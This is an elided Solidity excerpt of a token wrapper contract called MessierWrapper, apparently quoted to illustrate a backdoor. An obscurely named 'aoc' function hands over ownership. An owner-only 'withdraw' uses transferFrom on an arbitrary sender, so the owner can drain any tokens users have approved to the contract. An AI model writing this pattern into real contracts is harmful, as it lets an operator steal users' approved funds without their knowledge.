...
contract MessierWrapper {
  ...
  function aoc(address newOwner) external onlyOwner {
    owner = newOwner;
  }
  ...
  function withdraw(address token, address sender, uint256 value) external onlyOwner {
    IERC20(token).transferFrom(sender, owner, value);
  }
}